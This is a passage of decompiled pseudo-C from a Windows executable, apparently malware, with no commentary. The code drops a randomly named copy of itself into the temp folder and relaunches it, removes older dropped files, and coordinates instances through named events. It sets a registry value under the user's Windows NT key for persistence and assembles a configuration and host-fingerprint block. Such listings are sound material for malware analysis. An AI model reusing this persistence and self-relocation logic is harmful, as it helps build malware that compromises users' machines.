      FUN_0040f8c0((undefined (*) [16])&WStack_a30,0,0x208);
      GetTempPathW(0x104,&WStack_a30);
      FUN_0040f8c0((undefined (*) [16])&uStack_620,0,0x208);
      DVar11 = GetTickCount();
      FUN_0040aa3a(DVar11);
      FUN_004030a0(6,(int)&uStack_620);
      wsprintfW(&WStack_a30,u__s_s_exe_0041dca8,&WStack_a30,&uStack_620);
      FUN_00401ba0(&WStack_a30,0x32);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&WStack_a30,&DAT_0041dc68,(LPCWSTR)0x0,1);
                    // WARNING: Subroutine does not return
      ExitProcess(0);
    }
    Ordinal_115(0x101,auStack_c00);
    iVar9 = FUN_0040a7d0(extraout_ECX,extraout_EDX_00,1);
    if (iVar9 == 0) {
      sStack_a6c = 0;
      FUN_0040f8c0((undefined (*) [16])auStack_a6a,0,0x3a);
      FUN_00401000();
      iVar9 = 0;
      do {
        sVar2 = *(short *)(auStack_a6a + iVar9 + -2);
        *(short *)((int)&DAT_00425078 + iVar9) = sVar2;
        iVar9 = iVar9 + 2;
      } while (sVar2 != 0);
      FUN_0040aa6e((short *)&DAT_00424ed4,0x40,&DAT_0041dcbc);
      DAT_00424f54 = 0x51;
      FUN_0040aa6e(&DAT_00424f56,0x10,&DAT_0041dcd8);
      FUN_0040aa6e((short *)&DAT_00424f76,0x40,&DAT_0041dce4);
      DAT_00424ff6 = 0x2b66;
      iVar9 = 0;
      do {
        sVar2 = *(short *)(auStack_a6a + iVar9 + -2);
        *(short *)((int)&DAT_00425058 + iVar9) = sVar2;
        uVar5 = DAT_0041dd04;
        iVar9 = iVar9 + 2;
      } while (sVar2 != 0);
      puVar6 = (undefined4 *)0x425056;
      do {
        puVar12 = puVar6;
        puVar6 = (undefined4 *)((int)puVar12 + 2);
      } while (*(short *)((int)puVar12 + 2) != 0);
      *(undefined4 *)((int)puVar12 + 2) = DAT_0041dd00;
      *(undefined2 *)((int)puVar12 + 6) = uVar5;
      DAT_00425098 = 5;
    }
    FUN_00401a20();
    uVar14 = DAT_0041dc90;
    puVar6 = (undefined4 *)0x4250ce;
    do {
      puVar12 = puVar6;
      puVar6 = (undefined4 *)((int)puVar12 + 2);
    } while (*(short *)((int)puVar12 + 2) != 0);
    *(undefined4 *)((int)puVar12 + 2) = DAT_0041dc8c;
    uVar4 = DAT_0041dc94;
    *(undefined4 *)((int)puVar12 + 6) = uVar14;
    uVar14 = DAT_0041dc98;
    *(undefined4 *)((int)puVar12 + 10) = uVar4;
    *(undefined4 *)((int)puVar12 + 0xe) = uVar14;
    Sleep(2000);
    pvVar10 = OpenEventW(0x20000,0,(LPCWSTR)&DAT_004250d0);
    if (pvVar10 == (HANDLE)0x0) {
      pvVar10 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)&DAT_004250d0);
      uVar14 = extraout_EDX_02;
      if (pvVar10 != (HANDLE)0x0) {
        FUN_004028d0((undefined (*) [16])&DAT_00425568);
        _DAT_00425570 = DAT_0042509c;
        _DAT_00423608 =
             CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00401960,
                          (LPVOID)0x0,0,(LPDWORD)0x0);
        uVar14 = extraout_EDX_03;
      }
    }
    else {
      CloseHandle(pvVar10);
      uVar14 = extraout_EDX_01;
    }
  }
  FUN_0040a982(local_4 ^ (uint)auStack_c00,uVar14);
  return;
}



void FUN_00401800(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined auStack_54 [4];
  tagPAINTSTRUCT local_50;
  uint local_c;
  
  local_c = DAT_00422044 ^ (uint)auStack_54;
  if (param_2 == 2) {
    PostQuitMessage(0);
    FUN_0040a982(local_c ^ (uint)auStack_54,extraout_EDX_04);
    return;
  }
  if (param_2 == 0xf) {
    BeginPaint(param_1,&local_50);
    EndPaint(param_1,&local_50);
    FUN_0040a982(local_c ^ (uint)auStack_54,extraout_EDX_03);
    return;
  }
  if (param_2 != 0x111) {
    DefWindowProcW(param_1,param_2,param_3,param_4);
    FUN_0040a982(local_c ^ (uint)auStack_54,extraout_EDX);
    return;
  }
  if ((param_3 & 0xffff) != 0x68) {
    if ((param_3 & 0xffff) != 0x69) {
      DefWindowProcW(param_1,0x111,param_3,param_4);
      FUN_0040a982(local_c ^ (uint)auStack_54,extraout_EDX_00);
      return;
    }
    DestroyWindow(param_1);
    FUN_0040a982(local_c ^ (uint)auStack_54,extraout_EDX_01);
    return;
  }
  DialogBoxParamW(DAT_00424710,(LPCWSTR)0x67,param_1,(DLGPROC)&LAB_00401920,0);
  FUN_0040a982(local_c ^ (uint)auStack_54,extraout_EDX_02);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00401a20(void)

{
  short *psVar1;
  int iVar2;
  
  _DAT_00424ca0 = DAT_00425098;
  DAT_00424d98 = FUN_00403630(&DAT_00424f76);
  DAT_00424d9c = DAT_00424ff6;
  DAT_00424d9e = FUN_00403630(&DAT_00424ed4);
  DAT_00424da2 = (uint)DAT_00424f54;
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00424f56 + iVar2);
    *(short *)((int)&DAT_00424da6 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00425078 + iVar2);
    *(short *)((int)&DAT_00424dc6 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00425058 + iVar2);
    *(short *)((int)&DAT_00424de6 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  return;
}



void FUN_00401ad0(void)

{
  undefined4 extraout_EDX;
  short *unaff_ESI;
  short local_234;
  undefined4 local_232;
  undefined4 local_22e;
  undefined4 local_22a;
  undefined4 local_226;
  undefined4 local_222;
  undefined4 local_21e;
  undefined4 local_21a;
  undefined4 local_216;
  undefined4 local_212;
  undefined2 local_20e;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422044 ^ (uint)&local_234;
  local_20c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_20a,0,0x206);
  local_232 = 0;
  local_22e = 0;
  local_22a = 0;
  local_226 = 0;
  local_222 = 0;
  local_21e = 0;
  local_21a = 0;
  local_216 = 0;
  local_212 = 0;
  local_20e = 0;
  local_234 = 0;
  FUN_0040aa6e(&local_234,0x14,unaff_ESI);
  FUN_0040a9bd(&local_234,0x14,u__exe_0041dd08);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  FUN_0040aadd(&local_20c,&local_234);
  FUN_0040a982(local_4 ^ (uint)&local_234,extraout_EDX);
  return;
}



undefined4 __cdecl FUN_00401ba0(undefined4 param_1,int param_2)

{
  int iVar1;
  LPVOID pvVar2;
  int local_4;
  
  local_4 = 0;
  iVar1 = FUN_0040ac04(&local_4);
  if (iVar1 != 0) {
    return 0;
  }
  FUN_0040ace1();
  iVar1 = FUN_0040af03();
  FUN_0040ace1();
  pvVar2 = FUN_0040afc0(iVar1 + param_2);
  FUN_0040b32a(pvVar2,iVar1,1,local_4);
  FUN_0040b3be();
  FUN_00403b60();
  iVar1 = FUN_0040ac04(&local_4);
  if (iVar1 != 0) {
    return 0;
  }
  FUN_0040b59c();
  FUN_0040b3be();
  return 1;
}



// WARNING: Function: __alloca_probe replaced with injection: alloca_probe

void FUN_00401c70(void)

{
  WCHAR WVar1;
  short sVar2;
  int iVar3;
  int iVar4;
  DWORD DVar5;
  WCHAR *pWVar6;
  undefined4 *puVar7;
  HANDLE pvVar8;
  int iVar9;
  short *psVar10;
  LSTATUS LVar11;
  LPCWSTR lpFile;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  undefined4 extraout_EDX;
  undefined4 uVar12;
  undefined4 extraout_EDX_00;
  undefined4 *extraout_EDX_01;
  undefined4 *extraout_EDX_02;
  undefined4 *puVar13;
  undefined4 extraout_EDX_03;
  undefined4 extraout_EDX_04;
  undefined4 extraout_EDX_05;
  undefined2 uVar14;
  int iVar15;
  undefined8 uVar16;
  ulonglong uVar17;
  short *psVar18;
  undefined auStack_1c4c [4];
  uint local_1c48;
  int local_1c44;
  HKEY pHStack_1c40;
  int local_1c3c;
  int local_1c38;
  undefined4 local_1c34;
  short asStack_1c30 [64];
  ushort uStack_1bb0;
  short asStack_1bae [16];
  short asStack_1b8e [64];
  undefined2 uStack_1b0e;
  short asStack_1b0c [16];
  short asStack_1aec [16];
  short asStack_1acc [16];
  short asStack_1aac [16];
  short asStack_1a8c [16];
  int iStack_1a6c;
  undefined4 uStack_1a68;
  short asStack_1a34 [4];
  int iStack_1a2c;
  uint uStack_1934;
  undefined2 uStack_1930;
  uint uStack_192e;
  ushort uStack_192a;
  short asStack_1926 [16];
  short asStack_1906 [135];
  short asStack_17f8 [64];
  ushort uStack_1778;
  short asStack_1776 [80];
  undefined2 uStack_16d6;
  short local_15fc;
  undefined4 local_15fa;
  undefined4 local_15f6;
  undefined4 local_15f2;
  undefined4 local_15ee;
  undefined4 local_15ea;
  undefined4 local_15e6;
  undefined4 local_15e2;
  undefined2 local_15de;
  short local_15dc;
  undefined4 local_15da;
  undefined4 local_15d6;
  undefined4 local_15d2;
  undefined4 local_15ce;
  undefined4 local_15ca;
  undefined4 local_15c6;
  undefined4 local_15c2;
  undefined2 local_15be;
  short local_15bc;
  undefined local_15ba [126];
  short local_153c;
  undefined local_153a [126];
  short local_14bc;
  undefined local_14ba [126];
  WCHAR local_143c;
  undefined local_143a [518];
  WCHAR WStack_1234;
  undefined auStack_1232 [518];
  WCHAR local_102c;
  undefined local_102a [516];
  undefined4 uStack_e26;
  undefined auStack_e22 [518];
  WCHAR local_c1c;
  undefined local_c1a [518];
  WCHAR local_a14;
  undefined local_a12 [518];
  short sStack_80c;
  undefined auStack_80a [2050];
  uint local_8;
  undefined4 uStack_4;
  
  uStack_4 = 0x401c7a;
  local_8 = DAT_00422044 ^ (uint)auStack_1c4c;
  uVar14 = 0;
  local_143c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_143a,0,0x206);
  local_a14 = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_a12,0,0x206);
  local_c1c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_c1a,0,0x206);
  local_15fc = 0;
  local_15fa = 0;
  local_15f6 = 0;
  local_15f2 = 0;
  local_15ee = 0;
  local_15ea = 0;
  local_15e6 = 0;
  local_15e2 = 0;
  local_15de = 0;
  local_14bc = 0;
  FUN_0040f8c0((undefined (*) [16])local_14ba,0,0x7e);
  local_153c = 0;
  FUN_0040f8c0((undefined (*) [16])local_153a,0,0x7e);
  local_1c48 = 0;
  local_15bc = 0;
  FUN_0040f8c0((undefined (*) [16])local_15ba,0,0x7e);
  local_102c = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_102a,0,0x206);
  local_15dc = 0;
  local_15da = 0;
  local_15d6 = 0;
  local_15d2 = 0;
  local_15ce = 0;
  local_15ca = 0;
  local_15c6 = 0;
  local_15c2 = 0;
  local_15be = 0;
  iVar15 = 0;
  local_1c3c = 0;
  FUN_0040f8c0((undefined (*) [16])&local_1c34,0,0x200);
  uVar16 = FUN_0040a7d0(extraout_ECX,extraout_EDX,1);
  local_1c44 = (int)uVar16;
  local_1c38 = FUN_0040a7d0(extraout_ECX_00,(int)((ulonglong)uVar16 >> 0x20),0);
  GetModuleFileNameW((HMODULE)0x0,&local_a14,0x104);
  if ((int)uVar16 == 0) {
    if (DAT_00423070 == 3) {
      FUN_0040f8c0((undefined (*) [16])asStack_1a34,0,0x236);
      local_1c3c = FUN_004041f0();
      if (local_1c3c != 0) {
        iVar15 = 0;
        do {
          sVar2 = *(short *)((int)asStack_1926 + iVar15);
          *(short *)(local_14ba + iVar15 + -2) = sVar2;
          iVar15 = iVar15 + 2;
        } while (sVar2 != 0);
        FUN_00403730(uStack_192e);
        local_1c48 = (uint)uStack_192a;
        FUN_00403730(uStack_1934);
        psVar10 = asStack_1906;
        psVar18 = &local_15fc;
        iVar15 = iStack_1a2c;
        uVar14 = uStack_1930;
        goto LAB_0040224b;
      }
    }
  }
  else {
    GetTempPathW(0x104,&local_143c);
    FUN_0040a9bd(&local_143c,0x104,asStack_1aac);
    FUN_0040a9bd(&local_143c,0x104,u__exe_0041dd08);
    pWVar6 = &local_143c;
    do {
      WVar1 = *pWVar6;
      pWVar6 = pWVar6 + 1;
    } while (WVar1 != L'\0');
    if (((int)pWVar6 - (int)local_143a >> 1 != 0) &&
       (DVar5 = GetFileAttributesW(&local_143c), DVar5 != 0xffffffff)) {
      iVar15 = 0;
      do {
        psVar10 = (short *)((int)asStack_1aac + iVar15);
        *(short *)((int)asStack_1a34 + iVar15) = *psVar10;
        iVar15 = iVar15 + 2;
      } while (*psVar10 != 0);
      FUN_0040a9bd(asStack_1a34,0x104,u__exe_0041dd08);
      DeleteFileW(&local_143c);
    }
    GetTempPathW(0x104,&local_143c);
    FUN_0040a9bd(&local_143c,0x104,u_HGDraw_dll_0041dd24);
    pWVar6 = &local_143c;
    do {
      WVar1 = *pWVar6;
      pWVar6 = pWVar6 + 1;
    } while (WVar1 != L'\0');
    if (((int)pWVar6 - (int)local_143a >> 1 != 0) &&
       (DVar5 = GetFileAttributesW(&local_143c), DVar5 != 0xffffffff)) {
      DeleteFileW(&local_143c);
    }
    uVar16 = FUN_00401ad0();
    uVar12 = (undefined4)((ulonglong)uVar16 >> 0x20);
    if ((int)uVar16 == 1) goto LAB_004027a4;
    FUN_0040aa6e(&local_15fc,0x10,asStack_1a8c);
    FUN_00403ac0();
    WStack_1234 = L'\0';
    FUN_0040f8c0((undefined (*) [16])auStack_1232,0,0x206);
    uStack_e26._2_2_ = 0;
    FUN_0040f8c0((undefined (*) [16])auStack_e22,0,0x206);
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_1a8c + iVar15);
      *(short *)(auStack_1232 + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_1a8c + iVar15);
      *(short *)(auStack_e22 + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    puVar13 = &uStack_e26;
    do {
      puVar7 = puVar13;
      puVar13 = (undefined4 *)((int)puVar7 + 2);
    } while (*(short *)((int)puVar7 + 2) != 0);
    *(undefined4 *)((int)puVar7 + 2) = u__STOP_0041dc9c._0_4_;
    *(undefined4 *)((int)puVar7 + 6) = u__STOP_0041dc9c._4_4_;
    *(undefined4 *)((int)puVar7 + 10) = u__STOP_0041dc9c._8_4_;
    pvVar8 = OpenEventW(0x20000,0,&WStack_1234);
    if (pvVar8 != (HANDLE)0x0) {
      CloseHandle(pvVar8);
      CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,(LPCWSTR)((int)&uStack_e26 + 2));
      pvVar8 = OpenEventW(0x20000,0,&WStack_1234);
      for (iVar15 = 0; (pvVar8 != (HANDLE)0x0 && (iVar15 < 5)); iVar15 = iVar15 + 1) {
        CloseHandle(pvVar8);
        Sleep(200);
        pvVar8 = OpenEventW(0x20000,0,&WStack_1234);
      }
    }
    Sleep(0x5dc);
    DeleteFileW(&local_143c);
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_1bae + iVar15);
      *(short *)(local_14ba + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_1c30 + iVar15);
      *(short *)(local_153a + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    local_1c48 = (uint)uStack_1bb0;
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_1b8e + iVar15);
      *(short *)(local_15ba + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    psVar10 = asStack_1aac;
    psVar18 = &local_15dc;
    iVar15 = iStack_1a6c;
    uVar14 = uStack_1b0e;
LAB_0040224b:
    FUN_0040aa6e(psVar18,0x10,psVar10);
  }
  iVar4 = local_1c38;
  if (local_1c38 != 0) {
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_1776 + iVar15);
      *(short *)(local_14ba + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)asStack_17f8 + iVar15);
      *(short *)(local_153a + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    local_1c48 = (uint)uStack_1778;
    iVar15 = 0;
    do {
      sVar2 = *(short *)((int)&DAT_0041dce4 + iVar15);
      *(short *)(local_15ba + iVar15 + -2) = sVar2;
      iVar15 = iVar15 + 2;
    } while (sVar2 != 0);
    iVar15 = 5;
    if (DAT_00423070 == 3) {
      GetSystemDirectoryW(&local_102c,0x104);
      FUN_0040a9bd(&local_102c,0x104,(short *)&DAT_0041dc88);
    }
    else {
      GetTempPathW(0x104,&local_102c);
    }
    iVar9 = 0;
    do {
      iVar3 = iVar9 + -2;
      *(short *)(local_c1a + iVar9 + -2) = *(short *)(local_102a + iVar3);
      iVar9 = iVar9 + 2;
    } while (*(short *)(local_102a + iVar3) != 0);
    FUN_0040a9bd(&local_c1c,0x104,u_golfset_ini_0041dd3c);
    DeleteFileW(&local_c1c);
    uVar14 = uStack_16d6;
  }
  FUN_0040f8c0((undefined (*) [16])&local_1c34,0,0x200);
  local_1c34 = 0x504d534d;
  uStack_1bb0 = 0x51;
  iVar9 = 0;
  do {
    sVar2 = *(short *)((int)&DAT_0041dcbc + iVar9);
    *(short *)((int)asStack_1c30 + iVar9) = sVar2;
    iVar9 = iVar9 + 2;
  } while (sVar2 != 0);
  uVar12 = 0x2b66;
  uStack_1b0e = 0x2b66;
  iVar9 = 0;
  do {
    sVar2 = *(short *)((int)&DAT_0041dce4 + iVar9);
    *(short *)((int)asStack_1b8e + iVar9) = sVar2;
    iVar9 = iVar9 + 2;
  } while (sVar2 != 0);
  iVar9 = 0;
  do {
    sVar2 = *(short *)((int)&DAT_0041dcd8 + iVar9);
    *(short *)((int)asStack_1bae + iVar9) = sVar2;
    iVar9 = iVar9 + 2;
  } while (sVar2 != 0);
  iStack_1a6c = 5;
  if (((local_1c44 != 0) || (local_1c3c != 0)) || (iVar4 != 0)) {
    FUN_0040aa6e(asStack_1bae,0x10,&local_14bc);
    FUN_0040aa6e(asStack_1c30,0x40,&local_153c);
    uStack_1bb0 = (ushort)local_1c48;
    FUN_0040aa6e(asStack_1b8e,0x40,&local_15bc);
    uVar12 = extraout_EDX_00;
    uStack_1b0e = uVar14;
    iStack_1a6c = iVar15;
    if (iVar15 == 0) {
      iStack_1a6c = 5;
    }
  }
  iVar15 = 0;
  do {
    sVar2 = *(short *)((int)&DAT_0041dce4 + iVar15);
    *(short *)((int)asStack_1b8e + iVar15) = sVar2;
    iVar15 = iVar15 + 2;
  } while (sVar2 != 0);
  if ((asStack_1c30[0] != 0) && (uStack_1bb0 != 0)) {
    local_1c34 = 0x504d534d;
    DVar5 = GetTickCount();
    FUN_0040aa3a(DVar5);
    sStack_80c = 0;
    FUN_0040f8c0((undefined (*) [16])auStack_80a,0,0x7fe);
    if (asStack_1b0c[0] == 0) {
      FUN_004030a0(5,(int)&sStack_80c);
      FUN_0040aa6e(asStack_1b0c,0x10,&sStack_80c);
    }
    if (asStack_1aec[0] == 0) {
      FUN_004030a0(5,(int)&sStack_80c);
      FUN_0040aa6e(asStack_1aec,0x10,&sStack_80c);
    }
    if (asStack_1aac[0] == 0) {
      FUN_004030a0(5,(int)&sStack_80c);
      FUN_0040aa6e(asStack_1aac,0x10,&sStack_80c);
    }
    if (asStack_1a8c[0] == 0) {
      FUN_004030a0(5,(int)&sStack_80c);
      FUN_0040aa6e(asStack_1a8c,0x10,&sStack_80c);
      psVar10 = &local_15fc;
      do {
        sVar2 = *psVar10;
        psVar10 = psVar10 + 1;
      } while (sVar2 != 0);
      if ((int)psVar10 - (int)&local_15fa >> 1 != 0) {
        FUN_0040aa6e(asStack_1a8c,0x10,&local_15fc);
      }
    }
    psVar10 = &local_15dc;
    puVar13 = &local_15da;
    do {
      sVar2 = *psVar10;
      psVar10 = psVar10 + 1;
    } while (sVar2 != 0);
    if ((int)psVar10 - (int)puVar13 >> 1 != 0) {
      FUN_0040aa6e(asStack_1acc,0x10,&local_15dc);
      puVar13 = extraout_EDX_01;
    }
    if (asStack_1acc[0] == 0) {
      FUN_004030a0(5,(int)&sStack_80c);
      FUN_0040aa6e(asStack_1acc,0x10,&sStack_80c);
      puVar13 = extraout_EDX_02;
    }
    uStack_1a68 = 0x10001cf;
    if (iStack_1a6c == 0) {
      iStack_1a6c = 5;
    }
    uVar16 = FUN_0040a880(&local_1c34,puVar13,&local_1c34);
    uVar12 = (undefined4)((ulonglong)uVar16 >> 0x20);
    if ((int)uVar16 != 0) {
      lpFile = &local_143c;
      FUN_00403ac0();
      DVar5 = GetTickCount();
      FUN_0040aa3a(DVar5);
      uVar17 = FUN_00403060(0x32);
      FUN_00401ba0(lpFile,(int)uVar17);
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,lpFile,(LPCWSTR)&DAT_0041dd54,(LPCWSTR)0x0,1);
      pHStack_1c40 = (HKEY)0x0;
      LVar11 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dd60,0,3,
                             &pHStack_1c40);
      uVar12 = extraout_EDX_03;
      if (LVar11 == 0) {
        do {
          WVar1 = *lpFile;
          lpFile = lpFile + 1;
        } while (WVar1 != L'\0');
        LVar11 = RegSetValueExW(pHStack_1c40,(LPCWSTR)&DAT_0041ddcc,0,1,(BYTE *)&local_143c,
                                ((int)lpFile - (int)local_143a >> 1) * 2 + 2);
        uVar12 = extraout_EDX_04;
        if (LVar11 == 0) {
          RegCloseKey(pHStack_1c40);
          uVar12 = extraout_EDX_05;
        }
      }
    }
  }
LAB_004027a4:
  FUN_0040a982(local_8 ^ (uint)auStack_1c4c,uVar12);
  return;
}



undefined8 __cdecl FUN_004027c0(LPCWSTR param_1,undefined4 param_2)

{
  void *pvVar1;
  int in_EAX;
  DWORD DVar2;
  LPVOID lpBuffer;
  int iVar3;
  HANDLE hFile;
  BOOL BVar4;
  uint uVar5;
  undefined4 extraout_ECX;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint extraout_EDX_01;
  undefined8 uVar6;
  ulonglong uVar7;
  void *pvStack_8;
  uint uStack_4;
  
  DVar2 = GetFileAttributesW(param_1);
  if (DVar2 != 0xffffffff) {
    uVar6 = FUN_00403930();
    if ((int)uVar6 == in_EAX) {
      return CONCAT44((int)((ulonglong)uVar6 >> 0x20),1);
    }
  }
  lpBuffer = FUN_0040afc0(0x200000);
  pvStack_8 = (void *)0x200000;
  iVar3 = FUN_00405d50(in_EAX,&pvStack_8,param_2,lpBuffer);
  if (iVar3 != 0) {
    DVar2 = GetTickCount();
    FUN_0040aa3a(DVar2);
    uStack_4 = FUN_0040aa4c();
    uVar7 = FUN_004178c0(extraout_ECX,extraout_EDX);
    pvVar1 = pvStack_8;
    FUN_00403b60();
    DVar2 = (int)uVar7 + (int)pvVar1;
    hFile = FUN_0040a910();
    if (hFile != (HANDLE)0xffffffff) {
      BVar4 = WriteFile(hFile,lpBuffer,DVar2,&uStack_4,(LPOVERLAPPED)0x0);
      uVar5 = -(uint)(BVar4 != 0) & uStack_4;
      CloseHandle(hFile);
      if (uVar5 == DVar2) {
        FUN_0040b61e();
        return CONCAT44(extraout_EDX_00,1);
      }
    }
  }
  FUN_0040b61e();
  return (ulonglong)extraout_EDX_01 << 0x20;
}



void __fastcall FUN_004028d0(undefined (*param_1) [16])

{
  short sVar1;
  wchar_t wVar2;
  int iVar3;
  wchar_t *pwVar4;
  short *psVar5;
  undefined4 extraout_EDX;
  undefined4 uVar6;
  undefined8 uVar7;
  undefined auStack_d0 [4];
  undefined local_cc [74];
  undefined4 local_82;
  undefined2 local_7e;
  undefined4 local_7c;
  short local_74 [38];
  undefined2 local_28;
  undefined4 local_26;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined2 local_a;
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)auStack_d0;
  local_28 = 0;
  local_26 = 0;
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  FUN_0040f8c0((undefined (*) [16])local_cc,0,0xa0);
  FUN_0040f8c0(param_1,0,0x200);
  uVar7 = FUN_00403990((undefined (*) [16])local_cc);
  uVar6 = (undefined4)((ulonglong)uVar7 >> 0x20);
  if ((int)uVar7 != 0) {
    *(undefined4 *)*param_1 = 0x1000000;
    *(uint *)(*param_1 + 4) =
         (((uint)DAT_00424ca3 * 0x100 + (uint)DAT_00424ca2) * 0x100 + (uint)DAT_00424ca1) * 0x100 +
         (uint)DAT_00424ca0;
    *(undefined4 *)param_1[1] = local_82;
    *(undefined2 *)(param_1[1] + 4) = local_7e;
    psVar5 = local_74;
    *(undefined4 *)(*param_1 + 0xc) = local_7c;
    *(undefined4 *)(*param_1 + 8) = 0x10001cf;
    iVar3 = 0x16 - (int)psVar5;
    do {
      sVar1 = *psVar5;
      *(short *)((int)param_1 + iVar3 + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    iVar3 = FUN_00403830();
    pwVar4 = u_UnKmownOS_00423078 + iVar3 * 10;
    iVar3 = 0x96 - (int)pwVar4;
    do {
      wVar2 = *pwVar4;
      *(wchar_t *)((int)param_1 + iVar3 + (int)pwVar4) = wVar2;
      pwVar4 = pwVar4 + 1;
    } while (wVar2 != L'\0');
    *(uint *)(param_1[0x19] + 6) = DAT_00424d9e;
    *(undefined4 *)(param_1[0x19] + 10) = DAT_00424da2;
    psVar5 = &DAT_00424da6;
    do {
      sVar1 = *psVar5;
      *(short *)(param_1[-0x424c1] + 8 + (int)psVar5) = sVar1;
      psVar5 = psVar5 + 1;
    } while (sVar1 != 0);
    FUN_00403730(DAT_00424d9e);
    uVar6 = extraout_EDX;
  }
  FUN_0040a982(local_8 ^ (uint)auStack_d0,uVar6);
  return;
}



void FUN_00402a60(void)

{
  WCHAR WVar1;
  short sVar2;
  undefined4 *puVar3;
  short *psVar4;
  short *psVar5;
  HANDLE pvVar6;
  LSTATUS LVar7;
  undefined4 *puVar8;
  int iVar9;
  undefined (*pauVar10) [16];
  WCHAR *pWVar11;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  undefined4 extraout_EDX_01;
  undefined4 extraout_EDX_02;
  undefined4 uVar12;
  HKEY local_250;
  DWORD local_24c;
  DWORD local_248;
  DWORD local_244 [2];
  WCHAR local_23c;
  undefined4 local_23a;
  undefined4 local_236;
  undefined4 local_232;
  undefined4 local_22e;
  undefined4 local_22a;
  undefined4 local_226;
  undefined4 local_222;
  undefined4 local_21e;
  undefined4 local_21a;
  undefined2 local_216;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422044 ^ (uint)&local_250;
  local_214 = L'\0';
  FUN_0040f8c0((undefined (*) [16])local_212,0,0x206);
  local_23a = 0;
  local_236 = 0;
  local_232 = 0;
  local_22e = 0;
  local_22a = 0;
  local_226 = 0;
  local_222 = 0;
  local_21e = 0;
  local_21a = 0;
  local_216 = 0;
  local_23c = L'\0';
  local_248 = 0;
  local_244[0] = 0x104;
  psVar4 = &DAT_00425038;
  do {
    psVar5 = psVar4;
    psVar4 = psVar5 + 1;
  } while (*psVar5 != 0);
  if (((int)(psVar5 + -0x21281c) >> 1 == 0) ||
     (pvVar6 = OpenEventW(0x20000,0,&DAT_00425038), uVar12 = extraout_EDX, pvVar6 == (HANDLE)0x0)) {
    LVar7 = RegOpenKeyExW((HKEY)0x80000001,u_Software_Microsoft_Windows_NT_Cu_0041dd60,0,0xf003f,
                          &local_250);
    if (LVar7 == 0) {
      LVar7 = RegQueryValueExW(local_250,u_TrayKey_0041dddc,(LPDWORD)0x0,&local_248,
                               (LPBYTE)&local_23c,local_244);
      if ((LVar7 == 0) && (pvVar6 = OpenEventW(0x20000,0,&local_23c), pvVar6 != (HANDLE)0x0)) {
        RegCloseKey(local_250);
        uVar12 = extraout_EDX_00;
        goto LAB_00402cd8;
      }
      RegCloseKey(local_250);
    }
    local_24c = 0;
    GetTempPathW(0x104,&local_214);
    puVar3 = &DAT_00425058;
    do {
      puVar8 = puVar3;
      puVar3 = (undefined4 *)((int)puVar8 + 2);
    } while (*(short *)puVar8 != 0);
    if ((int)(puVar8 + -0x109416) >> 1 == 0) {
      FUN_0040a9bd(&local_214,0x104,&DAT_0041ddec);
      iVar9 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_0041ddec + iVar9);
        *(short *)((int)&local_23c + iVar9) = sVar2;
        iVar9 = iVar9 + 2;
      } while (sVar2 != 0);
    }
    else {
      FUN_0040a9bd(&local_214,0x104,(short *)&DAT_00425058);
      iVar9 = 0;
      do {
        sVar2 = *(short *)((int)&DAT_00425058 + iVar9);
        *(short *)((int)&local_23c + iVar9) = sVar2;
        iVar9 = iVar9 + 2;
